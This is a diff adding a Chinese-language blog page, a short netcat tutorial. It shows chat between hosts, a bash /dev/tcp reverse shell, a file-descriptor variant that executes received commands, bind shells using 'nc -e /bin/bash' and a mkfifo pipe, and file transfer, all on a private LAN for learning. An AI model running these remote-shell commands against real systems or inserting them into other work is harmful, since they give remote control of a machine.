@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/embpgp.github.io/function%20()%20%7B%0A%20%20%20%20%20%20for%20(var%20_len2%20=%20arguments.length,%20args%20=%20new%20Array(_len2),%20_key2%20=%200;%20_key2%20%3C%20_len2;%20_key2++)%20%7B%0A%20%20%20%20%20%20%20%20args%5B_key2%5D%20=%20arguments%5B_key2%5D;%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20return%20obj%5Bval%5D.apply(obj,%20args);%0A%20%20%20%20%7D">
+
+<link rel="stylesheet" href="/embpgp.github.io/css/main.css">
+
+
+<link rel="stylesheet" href="/embpgp.github.io/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"embpgp.github.io","root":"/embpgp.github.io/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="参考资料:http:&#x2F;&#x2F;netcat.sourceforge.net&#x2F;gnucitizen.orghttp:&#x2F;&#x2F;www.oschina.net&#x2F;translate&#x2F;linux-netcat-commandReverse shellNetCat for windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NetCat">
+<meta property="og:url" content="https://embpgp.github.io/2016/08/26/netcat%E7%AE%80%E8%BF%B0/index.html">
+<meta property="og:site_name" content="rutk1t0r&#39;s blog">
+<meta property="og:description" content="参考资料:http:&#x2F;&#x2F;netcat.sourceforge.net&#x2F;gnucitizen.orghttp:&#x2F;&#x2F;www.oschina.net&#x2F;translate&#x2F;linux-netcat-commandReverse shellNetCat for windows">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://embpgp.github.io/images/nc_liaotian.png">
+<meta property="og:image" content="https://embpgp.github.io/images/nc_reverse_shell.png">
+<meta property="og:image" content="https://embpgp.github.io/images/nc_bind_shell.png">
+<meta property="og:image" content="https://embpgp.github.io/images/nc_file_send.png">
+<meta property="article:published_time" content="2016-08-26T06:17:46.000Z">
+<meta property="article:modified_time" content="2025-03-11T12:14:38.967Z">
+<meta property="article:author" content="rutk1t0r">
+<meta property="article:tag" content="network security">
+<meta property="article:tag" content="shell">
+<meta property="article:tag" content="pipe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://embpgp.github.io/images/nc_liaotian.png">
+
+<link rel="canonical" href="https://embpgp.github.io/2016/08/26/netcat%E7%AE%80%E8%BF%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>NetCat | rutk1t0r's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/embpgp.github.io/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rutk1t0r's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Developer and Researcher</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/embpgp.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/embpgp.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/embpgp.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">29</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/embpgp.github.io/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/embpgp.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">39</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/embpgp.github.io/schedule/notes.html" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://embpgp.github.io/2016/08/26/netcat%E7%AE%80%E8%BF%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/embpgp.github.io/images/avatar.png">
+      <meta itemprop="name" content="rutk1t0r">
+      <meta itemprop="description" content="gnireenigne 0x41414141 \xff\xe4\xcc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rutk1t0r's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NetCat
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-08-26 14:17:46" itemprop="dateCreated datePublished" datetime="2016-08-26T14:17:46+08:00">2016-08-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-03-11 20:14:38" itemprop="dateModified" datetime="2025-03-11T20:14:38+08:00">2025-03-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/embpgp.github.io/categories/study/" itemprop="url" rel="index"><span itemprop="name">study</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>参考资料:<br><a target="_blank" rel="noopener" href="http://netcat.sourceforge.net/">http://netcat.sourceforge.net/</a><br><a target="_blank" rel="noopener" href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">gnucitizen.org</a><br><a target="_blank" rel="noopener" href="http://www.oschina.net/translate/linux-netcat-command">http://www.oschina.net/translate/linux-netcat-command</a><br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse shell</a><br><a target="_blank" rel="noopener" href="https://joncraton.org/blog/46/netcat-for-windows/">NetCat for windows</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="1-nc能干啥？"><a href="#1-nc能干啥？" class="headerlink" title="1. nc能干啥？"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>
+<hr>
+<h1 id="2-栗子"><a href="#2-栗子" class="headerlink" title="2. 栗子:"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>
+<h2 id="1-聊天"><a href="#1-聊天" class="headerlink" title="1. 聊天:"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src="/images/nc_liaotian.png" alt="nc_liaotian"></p>
+<h2 id="2-监听和反弹shell-reverse-shell"><a href="#2-监听和反弹shell-reverse-shell" class="headerlink" title="2.监听和反弹shell(reverse shell)"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src="/images/nc_reverse_shell.png" alt="Reverse_shell"><br>关于反弹shell的代码网络上有很多，比如<a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class="comment">#创建3号文件描述符绑定到一个读写的网络连接</span></span><br><span class="line"><span class="variable">$cat</span> &lt;&amp;3 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class="keyword">done</span><span class="comment">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="3-连接监听的shell-bind-shell"><a href="#3-连接监听的shell-bind-shell" class="headerlink" title="3. 连接监听的shell(bind shell)"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> -l port -e /bin/bash -i</span><br></pre></td></tr></table></figure>
+<p>在Client端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> server_ip port </span><br></pre></td></tr></table></figure>
+<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mkfifo</span> /tmp/tmp_fifo</span><br><span class="line"><span class="variable">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/tmp_fifo</span><br></pre></td></tr></table></figure>
+<p><img src="/images/nc_bind_shell.png" alt="bind_shell"></p>
+<h2 id="4-传送文件"><a href="#4-传送文件" class="headerlink" title="4. 传送文件"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>
+<p>Sender:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> -l Port &lt; file</span><br></pre></td></tr></table></figure>
+
+<p>Receiver:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> IP Port &gt; file</span><br></pre></td></tr></table></figure>
+<p><img src="/images/nc_file_send.png" alt="file_send"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>
+<hr>
+<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/embpgp.github.io/tags/network-security/" rel="tag"># network security</a>
+              <a href="/embpgp.github.io/tags/shell/" rel="tag"># shell</a>
+              <a href="/embpgp.github.io/tags/pipe/" rel="tag"># pipe</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2016/08/25/%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%AD%A6%E4%B9%A0%E6%A6%82%E5%86%B5/" rel="prev" title="无人机学习概况">
+      <i class="fa fa-chevron-left"></i> 无人机学习概况
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/" rel="next" title="C语言宏定义小试">
+      C语言宏定义小试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-nc%E8%83%BD%E5%B9%B2%E5%95%A5%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">1. nc能干啥？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%A0%97%E5%AD%90"><span class="nav-number">2.</span> <span class="nav-text">2. 栗子:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%81%8A%E5%A4%A9"><span class="nav-number">2.1.</span> <span class="nav-text">1. 聊天:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%9B%91%E5%90%AC%E5%92%8C%E5%8F%8D%E5%BC%B9shell-reverse-shell"><span class="nav-number">2.2.</span> <span class="nav-text">2.监听和反弹shell(reverse shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E8%BF%9E%E6%8E%A5%E7%9B%91%E5%90%AC%E7%9A%84shell-bind-shell"><span class="nav-number">2.3.</span> <span class="nav-text">3. 连接监听的shell(bind shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E4%BC%A0%E9%80%81%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.</span> <span class="nav-text">4. 传送文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">3. 总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rutk1t0r"
+      src="/embpgp.github.io/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rutk1t0r</p>
+  <div class="site-description" itemprop="description">gnireenigne 0x41414141 \xff\xe4\xcc</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/embpgp.github.io/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/embpgp.github.io/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/embpgp.github.io/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/embpgp" title="Github → https:&#x2F;&#x2F;github.com&#x2F;embpgp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/rutk1t0r" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;rutk1t0r" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.hicoder.cn/" title="http:&#x2F;&#x2F;www.hicoder.cn" rel="noopener" target="_blank">Yuan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/fangyz" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;fangyz" rel="noopener" target="_blank">Fangyz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://watch0.top/" title="http:&#x2F;&#x2F;watch0.top" rel="noopener" target="_blank">w@tch0</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rutk1t0r</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">149k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">2:16</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/embpgp.github.io/lib/anime.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/embpgp.github.io/js/utils.js"></script>
+
+<script src="/embpgp.github.io/js/motion.js"></script>
+
+
+<script src="/embpgp.github.io/js/schemes/pisces.js"></script>
+
+
+<script src="/embpgp.github.io/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/embpgp.github.io/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
